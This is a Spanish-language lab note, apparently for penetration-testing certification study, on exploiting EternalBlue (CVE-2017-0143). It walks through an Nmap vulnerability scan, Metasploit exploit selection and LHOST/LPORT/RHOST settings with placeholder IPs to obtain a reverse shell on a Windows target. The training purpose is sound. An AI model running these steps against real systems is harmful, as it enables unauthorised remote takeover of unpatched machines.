> **Nota:** este apunte lo hice sobre un laboratorio exclusivo del curso. He sustituido sus IPs por marcadores (`<IP_VICTIMA>`) y solo incluyo capturas genéricas, que no muestran contenido del curso.

1. Explotación:
	1. Detectar la vulnerabilidad con el script "*vuln*" de Nmap y obtener el CVE (vulnerabilidad publica):	
	```
	sudo nmap --script "vuln" -p445 <IP_VICTIMA>
	```
	![Nmap 3](ejpt/img/nmap-3.png)

	2. Abrir Metasploit:
	```
	msfconsole
	```
	**Recomendable abrir "*Metasploit*" desde el menu grafico por el nombre de "*metasploit-framework*" o "*metasploit framework*"**
	
	3. Buscar Exploits para esta vulnerabilidad:
	```
	search CVE-2017-0143
	```
	![Metasploit 1](ejpt/img/metasploit-1.png)
	3.1. Si **NO** sabemos la CVE (vulnerabilidad publica):
	```
	search eternalblue
	```
	![Metasploit 2](ejpt/img/metasploit-2.png)

4. Seleccionar el Exploit que queremos utlizar:
```
use 0
```

5. Completar el Exploit
	1. Ver el Exploit y el Payload:
	```
	show options
	```
	
	2. Establecer el LPORT (Puerto que dejaras en escucha y por el que recibiras la Reverse Shell), LHOST (IP atacante) y RHOST (IP victima):
	```
	set lhost <IP_ATACANTE>
	```
	
	```
	set lport 4444
	```
	
	```
	set rhost <IP_VICTIMA>
	```
	
	3. Comprobar que el Exploit se ha completado correctamente:
	```
	show options
	```

6. Ejecutar el Exploit (run o exploit):
```
run
```

```
exploit
```

7. Ya habrás recibido la Reverse Shell de la victima en el directorio ***C:\Windows\System32***.